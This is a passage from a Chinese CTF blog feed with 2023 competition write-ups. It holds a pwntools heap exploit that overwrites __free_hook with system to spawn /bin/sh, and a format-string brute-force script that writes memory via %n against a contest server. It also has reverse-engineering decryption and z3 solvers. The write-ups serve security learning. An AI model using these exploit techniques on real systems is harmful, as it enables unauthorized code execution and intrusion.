class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sell</span>(<span class="params"><span class="built_in">id</span>, flag=<span class="number">0</span>, content=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;want to buy\n&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	<span class="keyword">if</span> flag:</span><br><span class="line">		sla(<span class="string">&#x27;add something?Y/N\n&#x27;</span>, <span class="string">b&#x27;Y&#x27;</span>)</span><br><span class="line">		sa(<span class="string">&#x27;need in coffee\n&#x27;</span>, content)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		sla(<span class="string">&#x27;add something?Y/N\n&#x27;</span>, <span class="string">b&#x27;N&#x27;</span>)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, <span class="string">b&#x27;4421&#x27;</span>)</span><br><span class="line">	sa(<span class="string">&#x27;admin password\n&#x27;</span>, <span class="string">b&#x27;just pwn it&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">back</span>():</span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">replenish</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">	admin()</span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	back()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params"><span class="built_in">id</span>, coffee, content</span>):</span><br><span class="line">	admin()</span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	sla(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(coffee))</span><br><span class="line">	sa(<span class="string">&#x27;your content\n&#x27;</span>, content)</span><br><span class="line">	back()</span><br><span class="line"></span><br><span class="line">sell(<span class="number">1</span>)</span><br><span class="line">sell(<span class="number">1</span>)</span><br><span class="line">change(<span class="number">1</span>, <span class="number">2</span>, p64(<span class="number">0x4062F0</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	sell(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	replenish(<span class="number">2</span>)</span><br><span class="line">change(<span class="number">2</span>, <span class="number">7</span>, p64(<span class="number">0x406068</span>))</span><br><span class="line">sla(<span class="string">&#x27;&gt;&gt;&gt;&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">libc_base = uu64() - libc.sym[<span class="string">&#x27;atol&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;want to buy\n&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;add something?Y/N\n&#x27;</span>, <span class="string">b&#x27;N&#x27;</span>)</span><br><span class="line">sell(<span class="number">2</span>)</span><br><span class="line">change(<span class="number">2</span>, <span class="number">2</span>, p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] - <span class="number">8</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	sell(<span class="number">3</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	replenish(<span class="number">3</span>)</span><br><span class="line">change(<span class="number">3</span>, <span class="number">7</span>, p64(<span class="number">0</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">sell(<span class="number">3</span>, <span class="number">1</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="bad-pe"><a href="#bad-pe" class="headerlink" title="bad_pe"></a>bad_pe</h3><p>运行不起来，发现一个很奇怪的节 .ATOM，同时在最后发现有 <strong>(void (*)(void))</strong> 的执行，猜测是节的解密和执行。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231105182348458.png" alt="image-20231105182348458"></p>
<p>脚本异或解密一下看看，发现似乎不是修复成功的PE文件，没有MZ头。看了团队的脚本才知道和010打开来的不一样，不知道是什么原因，应该是PE文件被损坏的缘故叭。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = <span class="built_in">open</span>(<span class="string">&#x27;./bad_pe.exe&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>).read()[<span class="number">0x2e00</span>: <span class="number">0x2e00</span> + <span class="number">0xdd12</span>]</span><br><span class="line">rs = <span class="built_in">bytes</span>(i ^ <span class="number">0x23</span> <span class="keyword">for</span> i <span class="keyword">in</span> data)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;out&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(data)</span><br></pre></td></tr></table></figure>

<p>解密后看到久违的PE头拖入IDA分析，发现是 RC4，并且逻辑简单找到密钥和密文，直接嗦。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231105192626665.png" alt="image-20231105192626665"></p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231105193258021.png" alt="image-20231105193258021"></p>
<h3 id="安全编程"><a href="#安全编程" class="headerlink" title="安全编程"></a>安全编程</h3><p>Rust 写的一个游戏，定位字符串找到成功输出flag的地方，只要绕过上面的判断即可。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231105195702667.png" alt="image-20231105195702667"></p>
<p>v29 这个变量蛮可疑的，调试下来发现每次输入成功的时候都会进入，v29 就是我们输入的次数，改为100应该就能输出flag。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231105200117444.png" alt="image-20231105200117444"></p>
<h3 id="BabyRe"><a href="#BabyRe" class="headerlink" title="BabyRe"></a>BabyRe</h3><p>加密算法比较好找但是写解密脚本有点难度。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  v1 = &amp;v5;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">78</span>i64; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v1 = <span class="number">0xCCCCCCCC</span>;</span><br><span class="line">    v1 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_14001138E((__int64)&amp;unk_140022066);</span><br><span class="line">  v6 = *ipt;</span><br><span class="line">  v7 = ipt[<span class="number">1</span>];</span><br><span class="line">  v8 = ipt[<span class="number">2</span>];</span><br><span class="line">  srand(<span class="number">0xDEADC0DE</span>);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">32</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = (<span class="type">unsigned</span> __int8)v6;</span><br><span class="line">    v11 = BYTE1(v6);</span><br><span class="line">    v12 = BYTE2(v6);</span><br><span class="line">    v13 = HIBYTE(v6);</span><br><span class="line">    v14 = (<span class="type">unsigned</span> __int8)v7;</span><br><span class="line">    v15 = BYTE1(v7);</span><br><span class="line">    v16 = BYTE2(v7);</span><br><span class="line">    v17 = HIBYTE(v7);</span><br><span class="line">    v18 = (<span class="type">unsigned</span> __int8)v8;</span><br><span class="line">    v19 = BYTE1(v8);</span><br><span class="line">    v20 = BYTE2(v8);</span><br><span class="line">    v21 = HIBYTE(v8);</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="number">4</span>; ++k )</span><br><span class="line">    &#123;</span><br><span class="line">      *(&amp;v10 + k) = (<span class="type">unsigned</span> __int8)(<span class="number">23</span> * *((_BYTE *)&amp;v10 + <span class="number">4</span> * k) + <span class="number">66</span>);</span><br><span class="line">      *(&amp;v14 + k) = (<span class="type">unsigned</span> __int8)(<span class="number">23</span> * *((_BYTE *)&amp;v14 + <span class="number">4</span> * k) + <span class="number">66</span>);</span><br><span class="line">      *(&amp;v18 + k) = (<span class="type">unsigned</span> __int8)(<span class="number">23</span> * *((_BYTE *)&amp;v18 + <span class="number">4</span> * k) + <span class="number">66</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v6 = (v13 &lt;&lt; <span class="number">24</span>) | (v12 &lt;&lt; <span class="number">16</span>) | (v11 &lt;&lt; <span class="number">8</span>) | v10;</span><br><span class="line">    v7 = (v17 &lt;&lt; <span class="number">24</span>) | (v16 &lt;&lt; <span class="number">16</span>) | (v15 &lt;&lt; <span class="number">8</span>) | v14;</span><br><span class="line">    v8 = (v21 &lt;&lt; <span class="number">24</span>) | (v20 &lt;&lt; <span class="number">16</span>) | (v19 &lt;&lt; <span class="number">8</span>) | v18;</span><br><span class="line">    v23 = v7 &gt;&gt; <span class="number">7</span>;</span><br><span class="line">    v24 = rand() + v23;</span><br><span class="line">    v25 = (v7 &gt;&gt; <span class="number">15</span>) ^ (v7 &lt;&lt; <span class="number">10</span>) | <span class="number">3</span>;</span><br><span class="line">    v6 += v24 + (rand() ^ v25);</span><br><span class="line">    v23 = v8 &gt;&gt; <span class="number">7</span>;</span><br><span class="line">    v24 = rand() + v23;</span><br><span class="line">    v25 = (v8 &gt;&gt; <span class="number">15</span>) ^ (v8 &lt;&lt; <span class="number">10</span>) | <span class="number">3</span>;</span><br><span class="line">    v7 += v24 + (rand() ^ v25);</span><br><span class="line">    v23 = v6 &gt;&gt; <span class="number">7</span>;</span><br><span class="line">    v24 = rand() + v23;</span><br><span class="line">    v25 = (v6 &gt;&gt; <span class="number">15</span>) ^ (v6 &lt;&lt; <span class="number">10</span>) | <span class="number">3</span>;</span><br><span class="line">    v8 += v24 + (rand() ^ v25);</span><br><span class="line">  &#125;</span><br><span class="line">  *ipt = v6;</span><br><span class="line">  ipt[<span class="number">1</span>] = v7;</span><br><span class="line">  ipt[<span class="number">2</span>] = v8;</span><br><span class="line">  <span class="keyword">return</span> sub_14001132A((__int64)v4, (__int64)&amp;unk_14001ACC8);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>比赛时候逆运算一直写的除以23，没注意就说怎么数组里全是小于0x10的数。无语住了。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> ida_chars[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x48</span>, <span class="number">0x4D</span>, <span class="number">0x3B</span>, <span class="number">0xA0</span>, <span class="number">0x27</span>, <span class="number">0x31</span>, <span class="number">0x28</span>, <span class="number">0x54</span>, <span class="number">0x6D</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0x21</span>, <span class="number">0x35</span>, <span class="number">0x18</span>, <span class="number">0x73</span>, <span class="number">0x6A</span>, <span class="number">0x4C</span>, <span class="number">0x71</span>, <span class="number">0x3B</span>, <span class="number">0xBD</span>, <span class="number">0x98</span>, </span><br><span class="line">  <span class="number">0xB6</span>, <span class="number">0x5A</span>, <span class="number">0x77</span>, <span class="number">0x2D</span>, <span class="number">0x0B</span>, <span class="number">0x2B</span>, <span class="number">0xCB</span>, <span class="number">0x9B</span>, <span class="number">0xE4</span>, <span class="number">0x8A</span>, </span><br><span class="line">  <span class="number">0x4C</span>, <span class="number">0xA9</span>, <span class="number">0x5C</span>, <span class="number">0x4F</span>, <span class="number">0x1B</span>, <span class="number">0xF1</span>, <span class="number">0x98</span>, <span class="number">0x3D</span>, <span class="number">0x30</span>, <span class="number">0x59</span>, </span><br><span class="line">  <span class="number">0x3F</span>, <span class="number">0x14</span>, <span class="number">0xFC</span>, <span class="number">0x7A</span>, <span class="number">0xF4</span>, <span class="number">0x64</span>, <span class="number">0x02</span>, <span class="number">0x2B</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">decrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* data)</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>* __data = (<span class="type">unsigned</span> <span class="type">int</span>*) data;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> randArray[<span class="number">32</span>][<span class="number">6</span>];</span><br><span class="line">    srand(<span class="number">0xDEADC0DE</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">6</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            randArray[i][j] = rand();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">31</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> v23 = __data[<span class="number">0</span>] &gt;&gt; <span class="number">7</span>;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> v24 = randArray[i][<span class="number">4</span>] + v23;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> v25 = (__data[<span class="number">0</span>] &gt;&gt; <span class="number">15</span>) ^ (__data[<span class="number">0</span>] &lt;&lt; <span class="number">10</span>) | <span class="number">3</span>;</span><br><span class="line">        __data[<span class="number">2</span>] -= v24 + (randArray[i][<span class="number">5</span>] ^ v25);</span><br><span class="line"></span><br><span class="line">        v23 = __data[<span class="number">2</span>] &gt;&gt; <span class="number">7</span>;</span><br><span class="line">        v24 = randArray[i][<span class="number">2</span>] + v23;</span><br><span class="line">        v25 = (__data[<span class="number">2</span>] &gt;&gt; <span class="number">15</span>) ^ (__data[<span class="number">2</span>] &lt;&lt; <span class="number">10</span>) | <span class="number">3</span>;</span><br><span class="line">        __data[<span class="number">1</span>] -= v24 + (randArray[i][<span class="number">3</span>] ^ v25);</span><br><span class="line"></span><br><span class="line">        v23 = __data[<span class="number">1</span>] &gt;&gt; <span class="number">7</span>;</span><br><span class="line">        v24 = randArray[i][<span class="number">0</span>] + v23;</span><br><span class="line">        v25 = (__data[<span class="number">1</span>] &gt;&gt; <span class="number">15</span>) ^ (__data[<span class="number">1</span>] &lt;&lt; <span class="number">10</span>) | <span class="number">3</span>;</span><br><span class="line">        __data[<span class="number">0</span>] -= v24 + (randArray[i][<span class="number">1</span>] ^ v25);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">12</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            data[i] = (data[i] - <span class="number">66</span>) * <span class="number">167</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    decrypt((<span class="type">unsigned</span> <span class="type">char</span>*) ida_chars);</span><br><span class="line">    decrypt((<span class="type">unsigned</span> <span class="type">char</span>*) ida_chars + <span class="number">12</span>);</span><br><span class="line">    decrypt((<span class="type">unsigned</span> <span class="type">char</span>*) ida_chars + <span class="number">24</span>);</span><br><span class="line">    decrypt((<span class="type">unsigned</span> <span class="type">char</span>*) ida_chars + <span class="number">36</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x30</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, ida_chars[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>鹏城杯</tag>
      </tags>
  </entry>
  <entry>
    <title>2023 科来杯</title>
    <url>/2023/10/22/CTF/2023%E7%A7%91%E6%9D%A5%E6%9D%AF/</url>
    <content><![CDATA[<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h3><p>盲打字符串，给了key的位置，只要把key写到110就反弹到shell了。</p>
<p>收集栈信息的脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;error&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">40</span>):</span><br><span class="line">    <span class="keyword">try</span>: </span><br><span class="line">        sh = remote(<span class="string">&quot;192.168.2.236&quot;</span>, <span class="number">15082</span>)</span><br><span class="line">        sh.recvuntil(<span class="string">&quot;give me your name!\n&quot;</span>)</span><br><span class="line">        y = <span class="string">&#x27;abbbb&#x27;</span></span><br><span class="line">        x = y + <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;$p&quot;</span></span><br><span class="line">        sh.sendline(x)</span><br><span class="line">        sh.recvuntil(<span class="string">b&quot;welcome &quot;</span> + y.encode())</span><br><span class="line">        txt = sh.recvuntil(<span class="string">b&quot;\nBut key&quot;</span>).split(<span class="string">b&quot;\nBut key&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(i).encode() + <span class="string">b&quot; --- &quot;</span> + txt)</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>爆破脚本，最后到110的时候会卡住那就是成功了：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>, <span class="number">1000</span>):</span><br><span class="line">    <span class="comment"># pld = b&#x27;a&#x27; + b&#x27;%&#x27;+ str(i).encode() + b&#x27;c%10$n&#x27; + p32(0x804a02c)</span></span><br><span class="line">    <span class="comment"># pld = b&#x27;%&#x27; + str(i).encode() + b&#x27;c%10$n&#x27; + p32(0x804a02c)</span></span><br><span class="line">    pld = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(i).encode() + <span class="string">b&#x27;c%12$n&#x27;</span> + <span class="string">b&#x27;aaaaaaa&#x27;</span> + p32(<span class="number">0x804a02c</span>)</span><br><span class="line">    sh = remote(<span class="string">&quot;192.168.2.236&quot;</span>, <span class="number">15082</span>)</span><br><span class="line">    sh.sendline(pld)</span><br><span class="line">    txt = sh.recvall()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;false&#x27;</span> <span class="keyword">in</span> txt:</span><br><span class="line">        success(<span class="built_in">str</span>(i) + <span class="string">&#x27;  false&#x27;</span>)</span><br><span class="line">        sh.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        success(<span class="built_in">str</span>(i) + <span class="string">&#x27;  success&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="游戏人生"><a href="#游戏人生" class="headerlink" title="游戏人生"></a>游戏人生</h3><p>人生重开器，测试下来发现，在对应的年龄段有固定的几个选项，只要不死就能到下一个年龄段，最后到了60岁，如果几个方面都达到了标准就输出flag，直接找到解密输出的函数。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231023111535237.png" alt="image-20231023111535237"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">v15 = [<span class="number">432</span>,<span class="number">408</span>,<span class="number">429</span>,<span class="number">438</span>,<span class="number">452</span>,<span class="number">246</span>,<span class="number">243</span>,<span class="number">417</span>,<span class="number">423</span>,<span class="number">444</span>,<span class="number">236</span>,<span class="number">231</span>,<span class="number">240</span>,<span class="number">447</span>,<span class="number">207</span>,<span class="number">435</span>,<span class="number">253</span>,<span class="number">224</span></span><br><span class="line">,<span class="number">204</span>,<span class="number">443</span>,<span class="number">419</span>,<span class="number">248</span>,<span class="number">442</span>,<span class="number">241</span>,<span class="number">203</span>,<span class="number">251</span>,<span class="number">445</span>,<span class="number">239</span>,<span class="number">441</span>,<span class="number">254</span>,<span class="number">444</span>,<span class="number">246</span>,<span class="number">435</span>,<span class="number">245</span>,<span class="number">255</span>,<span class="number">445</span>,<span class="number">248</span>,<span class="number">478</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> v15:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>((i &gt;&gt; <span class="number">2</span>) ^ <span class="number">0xa</span>),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="大树"><a href="#大树" class="headerlink" title="大树"></a>大树</h3><p>Windows11缺少dll文件跑不起来，用队友的Windows10就能跑，不过问题不大，硬逆也能打。定位到关键字符串。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231023112013169.png" alt="image-20231023112013169"></p>
<p>两个判断函数，很简单的逻辑，直接用z3解就行了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> z3</span><br><span class="line"></span><br><span class="line">v71 = [<span class="number">2853</span>,<span class="number">2859</span>,<span class="number">2854</span>,<span class="number">2801</span>,<span class="number">2853</span>,<span class="number">2803</span>,<span class="number">2851</span>,<span class="number">2802</span>,<span class="number">2807</span>,<span class="number">2801</span>,</span><br><span class="line"><span class="number">2850</span>,<span class="number">2799</span>,<span class="number">2853</span>,<span class="number">2802</span>,<span class="number">2803</span>,<span class="number">2799</span>,<span class="number">2806</span>,<span class="number">2805</span>,<span class="number">2801</span>,<span class="number">2876</span>,<span class="number">2848</span>,<span class="number">2874</span>,</span><br><span class="line"><span class="number">2801</span>,<span class="number">2848</span>,<span class="number">2808</span>,<span class="number">2848</span>,<span class="number">2803</span>,<span class="number">2800</span>,<span class="number">2807</span>,<span class="number">2807</span>,<span class="number">2801</span>,<span class="number">2803</span>,<span class="number">2849</span>,<span class="number">2804</span>,</span><br><span class="line"><span class="number">2852</span>,<span class="number">2801</span>,<span class="number">2804</span>,<span class="number">2853</span>]</span><br><span class="line"></span><br><span class="line">v72 = [<span class="number">2876</span>,<span class="number">2801</span>,<span class="number">2805</span>,<span class="number">2806</span>,<span class="number">2799</span>,<span class="number">2803</span>,<span class="number">2802</span>,<span class="number">2853</span>,<span class="number">2799</span>,<span class="number">2850</span>,</span><br><span class="line"><span class="number">2801</span>,<span class="number">2807</span>,<span class="number">2802</span>,<span class="number">2851</span>,<span class="number">2803</span>,<span class="number">2853</span>,<span class="number">2801</span>,<span class="number">2854</span>,<span class="number">2859</span>,<span class="number">2853</span>,<span class="number">2848</span>,<span class="number">2874</span>,</span><br><span class="line"><span class="number">2801</span>,<span class="number">2848</span>,<span class="number">2808</span>,<span class="number">2848</span>,<span class="number">2803</span>,<span class="number">2800</span>,<span class="number">2807</span>,<span class="number">2807</span>,<span class="number">2801</span>,<span class="number">2803</span>,<span class="number">2849</span>,<span class="number">2804</span>,</span><br><span class="line"><span class="number">2852</span>,<span class="number">2801</span>,<span class="number">2804</span>,<span class="number">2853</span>]</span><br><span class="line"></span><br><span class="line">s = z3.Solver()</span><br><span class="line">txt1 = []</span><br><span class="line">txt2 = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">38</span>):</span><br><span class="line">    txt1.append(z3.Int(<span class="string">&#x27;x%d&#x27;</span> % i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">38</span>):</span><br><span class="line">    txt2.append(z3.Int(<span class="string">&#x27;y%d&#x27;</span> % i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">38</span>):</span><br><span class="line">    x = txt1[i]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">38</span>):</span><br><span class="line">        x += txt2[j]</span><br><span class="line">    s.add(x == v71[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">38</span>):</span><br><span class="line">    x = txt2[i]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">38</span>):</span><br><span class="line">        x += txt1[j]</span><br><span class="line">    s.add(x == v72[i])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(s.check())</span><br><span class="line">rs = s.model()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> txt1:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(rs[i].as_long()), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> txt2[::-<span class="number">1</span>]:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(rs[i].as_long()), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231023112359543.png" alt="image-20231023112359543"></p>
<p>发现flag是乱乱的，看起来像是奇偶交换，再找找逻辑。发现在判断函数的上面有取余交换的部分，因为没法调试，尝试嗦一下。</p>
<p><img src="https://blogimg-1311394354.cos.ap-nanjing.myqcloud.com/images/image-20231023112630905.png" alt="image-20231023112630905"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str1 = <span class="string">&#x27;g2f4d382c0f340762&#125;&#x27;</span></span><br><span class="line">str2 = <span class="string">&#x27;a&#123;2a9a418824b5e25f&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str1)):</span><br><span class="line">    flag += str2[i] + str1[i]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>除掉开头的两个字符，嗦成功了。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>科来杯</tag>
      </tags>
  </entry>
  <entry>
    <title>2023 香山杯</title>
    <url>/2023/10/18/CTF/2023%E9%A6%99%E5%B1%B1%E6%9D%AF/</url>
